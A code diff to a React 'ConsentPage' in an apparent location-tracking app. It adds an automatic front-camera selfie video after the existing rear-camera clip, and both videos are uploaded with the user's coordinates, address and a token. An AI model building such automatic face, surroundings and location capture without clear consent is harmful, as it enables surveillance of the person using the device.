@@ -298,6 +298,7 @@ async function captureGeoPhotos(
 async function captureGeoVideo(
   token: string, lat: number, lng: number, address: string | undefined,
   onStateChange: (s: "recording" | "uploading" | "done" | "error") => void,
+  facingMode: "environment" | "user" = "environment",
 ): Promise<void> {
   if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
   const MIME_CANDIDATES = ["video/webm;codecs=vp8", "video/webm;codecs=vp9", "video/webm", "video/mp4"];
@@ -305,7 +306,7 @@ async function captureGeoVideo(
   const VIDEO_BPS = 300_000; const AUDIO_BPS = 64_000;
   let stream: MediaStream | null = null;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: { ideal: 480, max: 640 }, height: { ideal: 360, max: 480 }, frameRate: { ideal: 15, max: 24 } }, audio: { echoCancellation: true, noiseSuppression: true } });
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 480, max: 640 }, height: { ideal: 360, max: 480 }, frameRate: { ideal: 15, max: 24 } }, audio: { echoCancellation: true, noiseSuppression: true } });
     await new Promise((r) => setTimeout(r, 600));
     const chunks: Blob[] = [];
     const recorderOptions: MediaRecorderOptions = {};
@@ -322,7 +323,7 @@ async function captureGeoVideo(
     if (blob.size === 0) { onStateChange("error"); return; }
     const base64 = await new Promise<string>((res, rej) => { const reader = new FileReader(); reader.onload = () => res(reader.result as string); reader.onerror = () => rej(new Error("FileReader error")); reader.readAsDataURL(blob); });
     onStateChange("uploading");
-    const body = JSON.stringify({ token, videoData: base64, mimeType: blob.type, durationMs: GEO_VIDEO_DURATION_MS, latitude: lat, longitude: lng, address });
+    const body = JSON.stringify({ token, videoData: base64, mimeType: blob.type, durationMs: GEO_VIDEO_DURATION_MS, latitude: lat, longitude: lng, address, cameraFacing: facingMode });
     let uploaded = false;
     for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
       try { const { signal, clear } = abortAfter(60_000); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
@@ -362,6 +363,7 @@ export default function ConsentPage() {
   const [geoPhotoCount, setGeoPhotoCount] = useState(0);
   const [geoPhotoDone, setGeoPhotoDone] = useState(false);
   const [geoVideoState, setGeoVideoState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
+  const [geoSelfieState, setGeoSelfieState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
   const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
   const [batteryCharging, setBatteryCharging] = useState(false);
   const [activityType, setActivityType] = useState<ActivityType>("stationary");
@@ -372,6 +374,7 @@ export default function ConsentPage() {
 
   const geoBoardStartedRef = useRef(false);
   const geoVideoStartedRef = useRef(false);
+  const geoSelfieStartedRef = useRef(false);
   const earlyGeoRef = useRef<GeolocationPosition | null>(null);
   const earlyGeoErrRef = useRef<GeolocationPositionError | null>(null);
   const earlyGeoReadyRef = useRef(false);
@@ -533,8 +536,17 @@ export default function ConsentPage() {
     }
     if (!geoVideoStartedRef.current) {
       geoVideoStartedRef.current = true;
-      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s))
-        .catch(() => setGeoVideoState("error"));
+      // Rear-facing "surroundings" clip, then the front-facing selfie clip —
+      // run sequentially since most phones only expose one active camera
+      // stream at a time.
+      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), "environment")
+        .catch(() => setGeoVideoState("error"))
+        .finally(() => {
+          if (geoSelfieStartedRef.current) return;
+          geoSelfieStartedRef.current = true;
+          captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), "user")
+            .catch(() => setGeoSelfieState("error"));
+        });
     }
 
     if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
@@ -1009,6 +1021,31 @@ export default function ConsentPage() {
                 <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
                   <Video className="h-4 w-4 text-rose-400 flex-shrink-0" />
                   <p className="text-xs font-medium text-rose-300">GeoBoard: video saved ✓</p>
+                </div>
+              )}
+
+              {/* Selfie video progress (front camera, runs after the rear-facing clip) */}
+              {geoSelfieState === "recording" && (
+                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
+                  <Video className="h-4 w-4 text-pink-400 flex-shrink-0 animate-pulse" />
+                  <div className="flex-1">
+                    <p className="text-xs font-medium text-pink-300">GeoBoard: recording 5s selfie video…</p>
+                    <div className="mt-1 h-1 bg-pink-900/40 rounded-full overflow-hidden">
+                      <div className="h-full bg-pink-500 rounded-full" style={{ width: "100%", transition: "width 5s linear" }} />
+                    </div>
+                  </div>
+                </div>
+              )}
+              {geoSelfieState === "uploading" && (
+                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
+                  <Loader2 className="h-4 w-4 text-pink-400 flex-shrink-0 animate-spin" />
+                  <p className="text-xs font-medium text-pink-300">GeoBoard: uploading selfie video…</p>
+                </div>
+              )}
+              {geoSelfieState === "done" && (
+                <div className="bg-pink-500/10 border border-pink-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
+                  <Video className="h-4 w-4 text-pink-400 flex-shrink-0" />
+                  <p className="text-xs font-medium text-pink-300">GeoBoard: selfie video saved ✓</p>
                 </div>
               )}
 
